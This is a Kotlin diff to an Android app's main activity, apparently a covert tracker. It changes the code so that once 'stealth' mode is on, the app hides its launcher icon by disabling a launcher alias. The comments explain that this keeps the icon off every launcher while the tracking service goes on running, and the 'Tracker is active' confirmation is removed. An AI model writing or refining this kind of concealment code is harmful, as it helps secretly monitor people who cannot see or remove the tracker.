@@ -76,9 +76,10 @@ class MainActivity : AppCompatActivity() {
         }
 
         if (prefs.getBoolean(Prefs.KEY_STEALTH_ACTIVATED, false)) {
-            // Already set up — just show confirmation and close
-            showStatus("🔒 Tracker is active")
-            Handler(Looper.getMainLooper()).postDelayed({ finishAndRemoveTask() }, 1200)
+            // Already set up — hide icon (in case first attempt didn't stick)
+            // then close immediately
+            hideLauncherIcon()
+            Handler(Looper.getMainLooper()).postDelayed({ finishAndRemoveTask() }, 500)
             return
         }
 
@@ -195,8 +196,13 @@ class MainActivity : AppCompatActivity() {
 
     private fun hideLauncherIcon() {
         try {
+            // Disable the ALIAS, not the activity itself.
+            // The alias is the only component with a LAUNCHER intent-filter,
+            // so disabling it removes the icon from the app drawer on all
+            // launchers (including Samsung One UI) without breaking the
+            // activity lifecycle or preventing the service from working.
             packageManager.setComponentEnabledSetting(
-                ComponentName(this, MainActivity::class.java),
+                ComponentName(packageName, "$packageName.LauncherAlias"),
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
